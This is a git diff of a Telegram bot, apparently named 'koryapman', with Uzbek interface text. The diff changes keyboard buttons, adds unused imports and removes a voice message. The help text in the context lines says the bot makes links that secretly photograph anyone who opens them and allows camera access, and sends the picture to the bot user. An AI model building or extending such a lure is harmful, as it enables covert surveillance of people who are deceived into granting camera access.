@@ -3,6 +3,8 @@ import TelegramBot from "node-telegram-bot-api";
 import path from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
+import { text } from "stream/consumers";
+import { url } from "inspector";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -21,7 +23,14 @@ bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);
 // Tugmalar
 const buttons = {
   reply_markup: {
-    keyboard: [[{ text: "📸 Rasm olish" }, { text: "🆘 Yordam" }]],
+    keyboard: [
+      [
+        { text: "📸 Rasm olish" },
+        { text: "📢 Kanal", url: "https://t.me/koryapman_bot" },
+      ],
+      [{ text: "🆘 Yordam" }],
+    ],
+
     resize_keyboard: true,
   },
 };
@@ -60,7 +69,6 @@ bot.on("message", (msg) => {
       chatId,
       "Shunchaki 📸 Rasm olish tugmasni bosing va berilgan linkni dostingizga jonating. Agar dostingiz linkga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'g'ri yo'lda foydalaning."
     );
-    bot.sendVoice(chatId, fs.createReadStream("music/koryapman.mp3"));
   }
 });
 
@@ -72,4 +80,3 @@ app.get("/selfie/:id", (req, res) => {
 app.listen(PORT, () => {
   console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
 });
-
